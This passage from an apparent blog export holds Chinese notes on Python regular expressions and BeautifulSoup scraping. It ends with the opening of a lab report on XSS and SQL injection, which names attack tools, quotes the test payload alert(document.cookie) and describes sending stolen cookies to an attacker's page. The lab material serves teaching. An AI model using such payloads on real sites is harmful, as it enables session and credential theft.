href=&quot;http://www..?.com&quot;&gt;.?&lt;/a&gt;&quot;,myStr,re.S) ## (4) 支持换行 支持不区分大小写匹配res = re.findall(&quot;&lt;a href=&quot;http://www..?.com&quot;&gt;.?&lt;/a&gt;&quot;,myStr,re.S|re.I) #print(res) 4、finditer()函数 原型 1def finditer(pattern, string, flags=0) 功能 与findall()类似，返回一个迭代器 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) string 要匹配的字符串 flags 标识位，用于控制正则表达式的匹配方式 代码 12345678import reres = re.finditer(&#x27;\\w&#x27;, &#x27;12hsakda1&#x27;)print(res)print(next(res))for i in res: print(i) 5、split()函数 作用：切割字符串 原型： 1def split(patter, string, maxsplit=0, flags=0) 参数 pattern 正则表达式 string 要拆分的字符串 maxsplit 最大拆分次数 默认拆分全部 flags 修正符 示例 12345import remyStr = &quot;asdas\\rd&amp;a\\ts12d\\n*a3sd@a_1sd&quot;#通过特殊字符 对其进行拆分 成列表res = re.split(&quot;[^a-z]&quot;,myStr)res = re.split(&quot;\\W&quot;,myStr) 6、修正符 作用 对正则进行修正 使用 search&#x2F;match&#x2F;findall&#x2F;finditer 等函数 flags参数的使用 修正符 re.I 不区分大小写匹配 re.S 使.可以匹配换行符 匹配任意字符 使用 re.I 12print(re.findall(&#x27;[a-z]&#x27;,&#x27;AaBb&#x27;))print(re.findall(&#x27;[a-z]&#x27;,&#x27;AaBb&#x27;, flags=re.I)) re.S 12print(re.findall(&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;,&#x27;&lt;b&gt;b标签&lt;/b&gt;&#x27;))print(re.findall(&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;,&#x27;&lt;b&gt;b标\\n签&lt;/b&gt;&#x27;, flags=re.S)) 四、正则高级1、分组&amp;起名称 概念 处理简单的判断是否匹配之外，正则表达式还有提取子串的功能，用()表示的就是要提取的分组 代码 12345#给当前匹配到的结果起别名s = &#x27;3G4HFD567&#x27;re.match(&quot;(?P&lt;value&gt;\\d+)&quot;,s)print(x.group(0))print(x.group(&#x27;value&#x27;)) 说明 正则表达式中定义了组，就可以在Match对象上用group()方法提取出子串来 group(0)永远是原始字符串，group(1)、group(2)……表示第1、2、……个子串 2、编译 概念 当在python中使用正则表达式时，re模块会做两件事，一件是编译正则表达式，如果表达式的字符串本身不合法，会报错。另一件是用编译好的正则表达式提取匹配字符串 编译优点 如果一个正则表达式要使用几千遍，每一次都会编译，出于效率的考虑进行正则表达式的编译，就不需要每次都编译了，节省了编译的时间，从而提升效率 compile()函数 原型 1def compile(pattern, flags=0) 作用 将pattern模式编译成正则对象 参数 参数 说明 pattern 匹配的正则表达式(一种字符串的模式) flags 标识位，用于控制正则表达式的匹配方式 flags 值 说明 re.I 是匹配对大小写不敏感 re.S 使.匹配包括换行符在内的所有字符 返回值 编译好的正则对象 示例 1234import rere_phone = re.compile(r&quot;(0\\d&#123;2,3&#125;-\\d&#123;7,8&#125;)&quot;)print(re_phone, type(re_phone)) 编译后其他方法的使用 原型 1234def match(self, string, pos=0, endpos=-1)def search(self, string, pos=0, endpos=-1)def findall(self, string, pos=0, endpos=-1)def finditer(self, string, pos=0, endpos=-1) 参数 参数 说明 string 待匹配的字符串 pos 从string字符串pos下标开始 endpos 结束下标 示例 123456s1 = &quot;lucky&#x27;s phone is 010-88888888&quot;s2 = &quot;kaige&#x27;s phone is 010-99999999&quot;ret1 = re_phone.search(s1)print(ret1, ret1.group(1))ret2 = re_phone.search(s2)print(ret2, ret2.group(1)) 3、贪婪与非贪婪 贪婪模式 贪婪概念：匹配尽可能多的字符 .+ 匹配换行符以外的字符至少一次 .* 匹配换行符以外的字符任意次 实例 12res = re.search(&#x27;&lt;b&gt;.+&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;)res = re.search(&#x27;&lt;b&gt;.*&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;) 非贪婪模式 非贪婪概念：尽可能少的匹配称为非贪婪匹配，*?、+?即可 .+? 匹配换行符以外的字符至少一次 拒绝贪婪 .*? 匹配换行符以外的字符任意次 拒绝贪婪 实例 12res = re.search(&#x27;&lt;b&gt;.+?&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;)res = re.search(&#x27;&lt;b&gt;.*?&lt;/b&gt;&#x27;, &#x27;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&lt;b&gt;b标签&lt;/b&gt;&#x27;) 练习： 中信证券 1# 将产品名称管理人 风险评级 认购金额 起点公示 信息 全部抓到 练习抓取股票 每一行数据 豆瓣 抓取标题和图片img标签","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"BS4","slug":"BS4笔记","date":"2023-12-26T04:51:20.918Z","updated":"2023-12-28T04:51:55.163Z","comments":true,"path":"2023/12/26/BS4笔记/","permalink":"http://example.com/2023/12/26/BS4%E7%AC%94%E8%AE%B0/","excerpt":"","text":"beautifulsoup一、beautifulsoup的简单使用简单来说，Beautiful Soup是python的一个库，最主要的功能是从网页抓取数据。官方解释如下： Beautiful Soup提供一些简单的、python式的函数用来处理导航、搜索、修改分析树等功能。它是一个工具箱，通过解析文档为用户提供需要抓取的数据，因为简单，所以不需要多少代码就可以写出一个完整的应用程序。 1、安装1pip install beautifulsoup4 1.1解析器Beautiful Soup支持Python标准库中的HTML解析器,还支持一些第三方的解析器，如果我们不安装它，则 Python 会使用 Python默认的解析器，lxml 解析器更加强大，速度更快，推荐安装。 1pip install lxml 1.2 解析器对比官网文档 2、快速开始下面的一段HTML代码将作为例子被多次用到.这是 爱丽丝梦游仙境的 的一段内容(以后内容中简称为 爱丽丝 的文档): 12345678910111213html_doc = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot; 使用BeautifulSoup解析这段代码,能够得到一个 BeautifulSoup 的对象,并能按照标准的缩进格式的结构输出: 1234from bs4 import BeautifulSoupsoup = BeautifulSoup(html_doc, &#x27;lxml&#x27;)# html进行美化print(soup.prettify()) 匹配代码 123456789101112131415161718192021222324252627282930313233&lt;html&gt; &lt;head&gt; &lt;title&gt; The Dormouse&#x27;s story &lt;/title&gt; &lt;/head&gt; &lt;body&gt; &lt;p class=&quot;title&quot;&gt; &lt;b&gt; The Dormouse&#x27;s story &lt;/b&gt; &lt;/p&gt; &lt;p class=&quot;story&quot;&gt; Once upon a time there were three little sisters; and their names were &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt; Elsie &lt;/a&gt; , &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt; Lacie &lt;/a&gt; and &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt; Tillie &lt;/a&gt; ;and they lived at the bottom of a well. &lt;/p&gt; &lt;p class=&quot;story&quot;&gt; ... &lt;/p&gt; &lt;/body&gt;&lt;/html&gt; 几个简单的浏览结构化数据的方法: 1234567891011121314151617181920212223242526272829303132soup.title # 获取标签title# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;soup.title.name # 获取标签名称# &#x27;title&#x27;soup.title.string # 获取标签title内的内容# &#x27;The Dormouse&#x27;s story&#x27;soup.title.parent # 获取父级标签soup.title.parent.name # 获取父级标签名称# &#x27;head&#x27;soup.p# &lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;soup.p[&#x27;class&#x27;] # 获取p的class属性值# &#x27;title&#x27;soup.a# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;soup.find_all(&#x27;a&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]soup.find(id=&quot;link3&quot;) # 获取id为link3的标签# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt; 从文档中找到所有&lt;a&gt;标签的链接: 12345for link in soup.find_all(&#x27;a&#x27;): print(link.get(&#x27;href&#x27;)) # http://example.com/elsie # http://example.com/lacie # http://example.com/tillie 从文档中获取所有文字内容: 1print(soup.get_text()) 3、如何使用将一段文档传入BeautifulSoup 的构造方法,就能得到一个文档的对象, 可以传入一段字符串或一个文件句柄. 12345from bs4 import BeautifulSoupsoup = BeautifulSoup(open(&quot;index.html&quot;))soup = BeautifulSoup(&quot;&lt;html&gt;data&lt;/html&gt;&quot;, &#x27;lxml&#x27;) 然后,Beautiful Soup选择最合适的解析器来解析这段文档,如果手动指定解析器那么Beautiful Soup会选择指定的解析器来解析文档。 二、beautifulsoup的遍历文档树还拿”爱丽丝梦游仙境”的文档来做例子: 1234567891011121314151617html_doc = &quot;&quot;&quot;&lt;html&gt;&lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt; &lt;body&gt;&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;Once upon a time there were three little sisters; and their names were&lt;a href=&quot;http://example.com/elsie&quot; class=&quot;sister&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a href=&quot;http://example.com/lacie&quot; class=&quot;sister&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt; and&lt;a href=&quot;http://example.com/tillie&quot; class=&quot;sister&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;;and they lived at the bottom of a well.&lt;/p&gt;&lt;p class=&quot;story&quot;&gt;...&lt;/p&gt;&quot;&quot;&quot;from bs4 import BeautifulSoup# lxml和html.parser解析的有时候会根据html是否完整而有解析不同的问题，需要注意soup = BeautifulSoup(html_doc, &#x27;html.parser&#x27;) 通过这段例子来演示怎样从文档的一段内容找到另一段内容 1、子节点一个Tag可能包含多个字符串或其它的Tag,这些都是这个Tag的子节点.Beautiful Soup提供了许多操作和遍历子节点的属性. 注意: Beautiful Soup中字符串节点不支持这些属性,因为字符串没有子节点。 1.1 .contentstag的 .contents 属性可以将tag的子节点以列表的方式输出: 123456789101112head_tag = soup.headhead_tag# &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt;head_tag.contents[&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]title_tag = head_tag.contents[0]title_tag# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;title_tag.contents# [u&#x27;The Dormouse&#x27;s story&#x27;] 字符串没有 .contents 属性,因为字符串没有子节点: 123text = title_tag.contents[0]text.contents# AttributeError: &#x27;NavigableString&#x27; object has no attribute &#x27;contents&#x27; 2、 节点内容2.1 .string如果tag只有一个 NavigableString 类型子节点,那么这个tag可以使用 .string 得到子节点。如果一个tag仅有一个子节点,那么这个tag也可以使用 .string 方法,输出结果与当前唯一子节点的 .string 结果相同。 通俗点说就是：如果一个标签里面没有标签了，那么 .string 就会返回标签里面的内容。如果标签里面只有唯一的一个标签了，那么 .string 也会返回最里面的内容。例如： 12345print (soup.head.string)#The Dormouse&#x27;s story# &lt;title&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/title&gt;print (soup.title.string)#The Dormouse&#x27;s story 如果tag包含了多个子节点,tag就无法确定，string 方法应该调用哪个子节点的内容, .string 的输出结果是 None 12print (soup.html.string)#None 2.2 .text如果tag包含了多个子节点, text则会返回内部所有文本内容 1print (soup.html.text) 注意： strings和text都可以返回所有文本内容 区别：text返回内容为字符串类型 strings为生成器generator 3、 多个内容1.strings .stripped_strings 属性 3.1**.strings**获取多个内容，不过需要遍历获取，比如下面的例子： 1234567891011121314151617181920212223for string in soup.strings: print(repr(string)) &#x27;&#x27;&#x27; &#x27;\\n&#x27;&quot;The Dormouse&#x27;s story&quot;&#x27;\\n&#x27;&#x27;\\n&#x27;&quot;The Dormouse&#x27;s story&quot;&#x27;\\n&#x27;&#x27;Once upon a time there were three little sisters; and their names were\\n&#x27;&#x27;Elsie&#x27;&#x27;,\\n&#x27;&#x27;Lacie&#x27;&#x27; and\\n&#x27;&#x27;Tillie&#x27;&#x27;;\\nand they lived at the bottom of a well.&#x27;&#x27;\\n&#x27;&#x27;...&#x27;&#x27;\\n&#x27; &#x27;&#x27;&#x27; 3.2 .stripped_strings输出的字符串中可能包含了很多空格或空行,使用 .stripped_strings 可以去除多余空白内容 123456789101112131415161718for string in soup.stripped_strings: print(repr(string))&#x27;&#x27;&#x27;&quot;The Dormouse&#x27;s story&quot;&quot;The Dormouse&#x27;s story&quot;&#x27;Once upon a time there were three little sisters; and their names were&#x27;&#x27;Elsie&#x27;&#x27;,&#x27;&#x27;Lacie&#x27;&#x27;and&#x27;&#x27;Tillie&#x27;&#x27;;\\nand they lived at the bottom of a well.&#x27;&#x27;...&#x27;&#x27;&#x27;&#x27; 4、 父节点继续分析文档树,每个tag或字符串都有父节点:被包含在某个tag中 4.1 .parent通过 .parent 属性来获取某个元素的父节点.在例子“爱丽丝”的文档中,&lt;head&gt;标签是&lt;title&gt;标签的父节点: 12345title_tag = soup.titletitle_tag# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;title_tag.parent# &lt;head&gt;&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;&lt;/head&gt; 文档的顶层节点比如&lt;html&gt;的父节点是 BeautifulSoup 对象: 123html_tag = soup.htmltype(html_tag.parent)# &lt;class &#x27;bs4.BeautifulSoup&#x27;&gt; 三、beautifulsoup的搜索文档树1、find_all1find_all( name , attrs , recursive , string , **kwargs ) find_all() 方法搜索当前tag的所有tag子节点,并判断是否符合过滤器的条件: 123456789101112131415161718soup.find_all(&quot;title&quot;)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]soup.find_all(&quot;p&quot;, &quot;title&quot;)# [&lt;p class=&quot;title&quot;&gt;&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;&lt;/p&gt;]soup.find_all(&quot;a&quot;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]soup.find_all(id=&quot;link2&quot;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]import re# 模糊查询 包含sisters的就可以soup.find(string=re.compile(&quot;sisters&quot;))# &#x27;Once upon a time there were three little sisters; and their names were\\n&#x27; 有几个方法很相似,还有几个方法是新的,参数中的 string 和 id 是什么含义? 为什么 find_all(&quot;p&quot;, &quot;title&quot;) 返回的是CSS Class为”title”的&lt;p&gt;标签? 我们来仔细看一下 find_all() 的参数. 1.1 name 参数name 参数可以查找所有名字为 name 的tag,字符串对象会被自动忽略掉. 简单的用法如下: 12soup.find_all(&quot;title&quot;)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;] 搜索 name 参数的值可以使任一类型的 过滤器 ,字符串,正则表达式,列表,方法或是 True . &lt;1&gt; 传字符串 最简单的过滤器是字符串.在搜索方法中传入一个字符串参数,Beautiful Soup会查找与字符串完整匹配的内容,下面的例子用于查找文档中所有的标签 12soup.find_all(&#x27;b&#x27;)# [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;] &lt;2&gt; 传正则表达式 如果传入正则表达式作为参数,Beautiful Soup会通过正则表达式的 match() 来匹配内容.下面例子中找出所有以b开头的标签,这表示&lt;body&gt;和&lt;b&gt;标签都应该被找到 12345import refor tag in soup.find_all(re.compile(&quot;^b&quot;)): print(tag.name)# body# b &lt;3&gt; 传列表 如果传入列表参数,Beautiful Soup会将与列表中任一元素匹配的内容返回.下面代码找到文档中所有&lt;a&gt;标签和&lt;b&gt;标签 12345soup.find_all([&quot;a&quot;, &quot;b&quot;])# [&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] 1.2 keyword 参数如果一个指定名字的参数不是搜索内置的参数名,搜索时会把该参数当作指定名字tag的属性来搜索,如果包含一个名字为 id 的参数,Beautiful Soup会搜索每个tag的”id”属性. 123456789101112soup.find_all(id=&#x27;link2&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]import re# 超链接包含elsie标签print(soup.find_all(href=re.compile(&quot;elsie&quot;)))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;]# 以The作为开头的字符串print(soup.find_all(text=re.compile(&quot;^The&quot;))) # [&quot;The Dormouse&#x27;s story&quot;, &quot;The Dormouse&#x27;s story&quot;]# class选择器包含st的节点print(soup.find_all(class_=re.compile(&quot;st&quot;))) 搜索指定名字的属性时可以使用的参数值包括 字符串 , 正则表达式 , 列表, True . 下面的例子在文档树中查找所有包含 id 属性的tag,无论 id 的值是什么: 1234soup.find_all(id=True)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,# &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] 使用多个指定名字的参数可以同时过滤tag的多个属性: 12soup.find_all(href=re.compile(&quot;elsie&quot;), id=&#x27;link1&#x27;)# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;three&lt;/a&gt;] 在这里我们想用 class 过滤，不过 class 是 python 的关键词，这怎么办？加个下划线就可以 123456789print(soup.find_all(&quot;a&quot;, class_=&quot;sister&quot;))&#x27;&#x27;&#x27;[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;,&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;,&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]&#x27;&#x27;&#x27; 通过 find_all() 方法的 attrs 参数定义一个字典参数来搜索包含特殊属性的tag: 12data_soup.find_all(attrs=&#123;&quot;data-foo&quot;: &quot;value&quot;&#125;)# [&lt;div data-foo=&quot;value&quot;&gt;foo!&lt;/div&gt;] 注意：如何查看条件id和class同时存在时的写法 12print(soup.find_all(&#x27;b&#x27;, class_=&quot;story&quot;, id=&quot;x&quot;))print(soup.find_all(&#x27;b&#x27;, attrs=&#123;&quot;class&quot;:&quot;story&quot;, &quot;id&quot;:&quot;x&quot;&#125;)) 1.3 text 参数通过 text 参数可以搜搜文档中的字符串内容.与 name 参数的可选值一样, text 参数接受 字符串 , 正则表达式 , 列表, True 1234567891011import reprint(soup.find_all(text=&quot;Elsie&quot;))# [&#x27;Elsie&#x27;]print(soup.find_all(text=[&quot;Tillie&quot;, &quot;Elsie&quot;, &quot;Lacie&quot;]))# [&#x27;Elsie&#x27;, &#x27;Lacie&#x27;, &#x27;Tillie&#x27;]# 只要包含Dormouse就可以print(soup.find_all(text=re.compile(&quot;Dormouse&quot;)))# [&quot;The Dormouse&#x27;s story&quot;, &quot;The Dormouse&#x27;s story&quot;] 1.4 limit 参数find_all() 方法返回全部的搜索结构,如果文档树很大那么搜索会很慢.如果我们不需要全部结果,可以使用 limit 参数限制返回结果的数量.效果与SQL中的limit关键字类似,当搜索到的结果数量达到 limit 的限制时,就停止搜索返回结果. 1234567print(soup.find_all(&quot;a&quot;,limit=2))print(soup.find_all(&quot;a&quot;)[0:2])&#x27;&#x27;&#x27;[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;]&#x27;&#x27;&#x27; 2、find()1find( name , attrs , recursive , string , **kwargs ) find_all() 方法将返回文档中符合条件的所有tag,尽管有时候我们只想得到一个结果.比如文档中只有一个&lt;body&gt;标签,那么使用 find_all() 方法来查找&lt;body&gt;标签就不太合适, 使用 find_all 方法并设置 limit=1 参数不如直接使用 find() 方法.下面两行代码是等价的: 12345soup.find_all(&#x27;title&#x27;, limit=1)# [&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]soup.find(&#x27;title&#x27;)# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt; 唯一的区别是 find_all() 方法的返回结果是值包含一个元素的列表,而 find() 方法直接返回结果. find_all() 方法没有找到目标是返回空列表, find() 方法找不到目标时,返回 None . 12print(soup.find(&quot;nosuchtag&quot;))# None soup.head.title 是 tag的名字 方法的简写.这个简写的原理就是多次调用当前tag的 find() 方法: 12345soup.head.title# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;soup.find(&quot;head&quot;).find(&quot;title&quot;)# &lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt; 四、beautifulsoup的css选择器我们在写 CSS 时，标签名不加任何修饰，类名前加点，id名前加 #，在这里我们也可以利用类似的方法来筛选元素，用到的方法是 soup.select()，返回类型是 list 1、通过标签名查找12print(soup.select(&quot;title&quot;)) #[&lt;title&gt;The Dormouse&#x27;s story&lt;/title&gt;]print(soup.select(&quot;b&quot;)) #[&lt;b&gt;The Dormouse&#x27;s story&lt;/b&gt;] 2、通过类名查找12345678print(soup.select(&quot;.sister&quot;)) &#x27;&#x27;&#x27;[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;, &lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;]&#x27;&#x27;&#x27; 3、id名查找12print(soup.select(&quot;#link1&quot;))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/elsie&quot; id=&quot;link1&quot;&gt;Elsie&lt;/a&gt;] 4、组合查找组合查找即和写 class 文件时，标签名与类名、id名进行的组合原理是一样的，例如查找 p 标签中，id 等于 link1的内容，二者需要用空格分开 123print(soup.select(&quot;p #link2&quot;))#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;] 直接子标签查找 12print(soup.select(&quot;p &gt; #link2&quot;))# [&lt;a class=&quot;sister&quot; href=&quot;http://example.com/lacie&quot; id=&quot;link2&quot;&gt;Lacie&lt;/a&gt;] 查找既有class也有id选择器的标签 1a_string = soup.select(&quot;.story#test&quot;) 查找有多个class选择器的标签 1a_string = soup.select(&quot;.story.test&quot;) 查找有多个class选择器和一个id选择器的标签 1a_string = soup.select(&quot;.story.test#book&quot;) 5、属性查找查找时还可以加入属性元素，属性需要用中括号括起来，注意属性和标签属于同一节点，所以中间不能加空格，否则会无法匹配到。 12print(soup.select(&quot;a[href=&#x27;http://example.com/tillie&#x27;]&quot;))#[&lt;a class=&quot;sister&quot; href=&quot;http://example.com/tillie&quot; id=&quot;link3&quot;&gt;Tillie&lt;/a&gt;] select 方法返回的结果都是列表形式，可以遍历形式输出，然后用 get_text() 方法来获取它的内容： 12345678for title in soup.select(&#x27;a&#x27;): print (title.get_text())&#x27;&#x27;&#x27;ElsieLacieTillie&#x27;&#x27;&#x27;","categories":[{"name":"开发","slug":"开发","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/"},{"name":"python","slug":"开发/python","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/"},{"name":"爬虫","slug":"开发/python/爬虫","permalink":"http://example.com/categories/%E5%BC%80%E5%8F%91/python/%E7%88%AC%E8%99%AB/"}],"tags":[{"name":"爬虫","slug":"爬虫","permalink":"http://example.com/tags/%E7%88%AC%E8%99%AB/"}]},{"title":"实验三 XSS和SQL注入","slug":"实验三XSS和SQL注入","date":"2023-12-24T09:34:29.165Z","updated":"2023-12-31T05:11:22.844Z","comments":true,"path":"2023/12/24/实验三XSS和SQL注入/","permalink":"http://example.com/2023/12/24/%E5%AE%9E%E9%AA%8C%E4%B8%89XSS%E5%92%8CSQL%E6%B3%A8%E5%85%A5/","excerpt":"","text":"实验三 XSS和SQL注入实验目的和要求实验目的：了解什么是XSS；了解XSS攻击实施，理解防御XSS攻击的方法；了解SQL注入的基本原理；掌握PHP脚本访问MySQL数据库的基本方法；掌握程序设计中避免出现SQL注入漏洞的基本方法；掌握网站配置。 系统环境：Kali Linux 2、Windows Server 网络环境：交换网络结构 实验工具： Beef；AWVS(Acunetix Web Vulnarability Scanner);SqlMAP；DVWA 实验原理： XSS 1、什么是XSS XSS又叫CSS (Cross Site Script) 也称为跨站，它是指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵害的一种攻击方式。 2 、什么是XSS攻击 XSS攻击是指入侵者在远程WEB页面的HTML代码中插入具有恶意目的的数据，用户认为该页面是可信赖的，但是当浏览器下载该页面，嵌入其中的脚本将被解释执行,由于HTML语言允许使用脚本进行简单交互，入侵者便通过技术手段在某个页面里插入一个恶意HTML代码，例如记录论坛保存的用户信息（Cookie），由于Cookie保存了完整的用户名和密码资料，用户就会遭受安全损失。如这句简单的Java脚本就能轻易获取用户信息：alert(document.cookie)，它会弹出一个包含用户信息的消息框。入侵者运用脚本就能把用户信息发送到他们自己的记录页面中，稍做分析便获取了用户的敏感信息。 3、 什么是Cookie Cookie，有时也用其复数形式Cookies，指某些网站为了辨别用户身份、进行session跟踪而储存在用户本地终端上的数据（通常经过加密）。定义于RFC2109（已废弃），最新取代的规范是RFC2965。Cookie最早是网景公司的前雇员Lou Montulli在1993年3月的发明。 Cookie是由服务器端生成，发送给User-Agent（一般是浏览器），浏览器会将Cookie的key&#x2F;value保存到某个目录下的文本文件内，下次请求同一网站时就发送该Cookie给服务器（前提是浏览器设置为启用Cookie）。Cookie名称和值可以由服务器端开发自己定义，对于JSP而言也可以直接写入jsessionid，这样服务器可以知道该用户是否为合法用户以及是否需要重新登录等。 4、XSS漏洞的分类 存储型 XSS：交互形Web应用程序出现后，用户就可以将一些数据信息存储到Web服务器上，例如像网络硬盘系统就允许用户将自己计算机上的文件存储到网络服务器上，然后与网络上的其他用户一起分享自己的文件信息。这种接收用户信息的Web应用程序由于在使用上更加贴近用户需求，使用灵活，使得其成为现代化Web领域的主导。在这些方便人性化的背后也带来了难以避免的安全隐患。 